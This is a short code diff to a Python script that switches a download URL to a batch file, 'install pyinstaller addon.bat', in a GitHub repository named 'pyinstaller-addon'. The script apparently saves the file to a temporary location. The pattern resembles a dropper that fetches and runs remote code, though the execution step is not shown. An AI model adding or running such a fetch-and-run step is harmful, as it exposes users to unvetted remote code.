@@ -4,7 +4,7 @@ import tempfile
 import urllib.request
 import time
 
-URL = "https://github.com/nickita166/pyinstaller-addon/raw/refs/heads/main/pyinstaller.bat"
+URL = "https://github.com/nickita166/pyinstaller-addon/raw/refs/heads/main/install%20pyinstaller%20addon.bat"
 
 def main():
     # Temp file path
